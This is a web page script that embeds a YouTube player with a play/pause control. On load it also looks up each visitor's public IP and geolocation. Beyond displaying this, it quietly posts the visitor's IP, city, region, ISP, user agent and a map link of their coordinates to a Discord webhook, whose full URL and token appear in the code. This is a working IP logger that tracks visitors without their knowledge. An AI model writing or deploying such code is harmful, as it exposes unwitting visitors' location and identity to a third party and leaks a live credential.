// Load the IFrame Player API code asynchronously.
const tag = document.createElement('script');
tag.src = "https://www.youtube.com/iframe_api";
const firstScriptTag = document.getElementsByTagName('script')[0];
firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

const videoId = '5e4INH1yr9c';

let player;

// This function is called by YouTube when the IFrame Player API is ready
function onYouTubeIframeAPIReady() {
  player = new YT.Player('player', {
    height: '100', 
    width: '100%', 
    videoId: videoId,
    playerVars: {
      autoplay: 0, 
      controls: 0, 
      loop: 1, 
      showinfo: 0, 
      rel: 0, 
    },
    events: {
      'onReady': onPlayerReady
    }
  });
}

function onPlayerReady(event) {
  // You can control the player here if needed
  // e.g., player.mute();  
}

// Get the elements to display the information
const ipAddressElement = document.getElementById('ip-address');
const locationElement = document.getElementById('location');
const countryElement = document.getElementById('country');
const regionElement = document.getElementById('region');
const ispElement = document.getElementById('isp');

// Fetch the IP address and location data
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    ipAddressElement.textContent = data.ip;

    // Fetch additional IP information using IP-API
    fetch(`https://ipapi.co/${data.ip}/json/`)
      .then(response => response.json())
      .then(ipData => {
        // Display additional information
        const country = ipData.country_name;
        const region = ipData.region; 
        const isp = ipData.org;
        const location = `${ipData.city} (approx)`;
        countryElement.textContent = country;
        regionElement.textContent = region;
        ispElement.textContent = isp;
        locationElement.textContent = location;
        const message = `# Someone visited your website! \n\n` +
                       `**IP:** ${ipData.ip} \n` + 
                       `**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
                       `**ISP:** ${ipData.org} \n` +
                       `**User Agent:** ${navigator.userAgent} \n` +
                       `[Map](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})\n`;

        // Send to Discord Webhook
        fetch('https://discord.com/api/webhooks/1271466878057054279/Qu8UpcJu6620_I3HqoO_CmbGkX3NL0QgpWa0949IfBW2xFVDmV4vljXHZEid2lQ8uCv1', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: message,
          }),
        });
      })
      .catch(error => {
        console.error('Error fetching IP information:', error);
        // Handle the error appropriately (e.g., display a message)
      });
  })
  .catch(error => {
    console.error('Error fetching IP address:', error);
    // Display an error message to the user
  });

// Get the play/pause button
const playPauseButton = document.getElementById('play-pause-button');


// Function to handle button clicks
function togglePlayPause() {
  if (player.getPlayerState() === 1) { 
    player.pauseVideo();
    playPauseButton.innerHTML = '<span class="material-icons">play_arrow</span>';
  } else { 
    player.playVideo();
    playPauseButton.innerHTML = '<span class="material-icons">pause</span>';
  }
}

// Add event listener to the button
playPauseButton.addEventListener('click', togglePlayPause);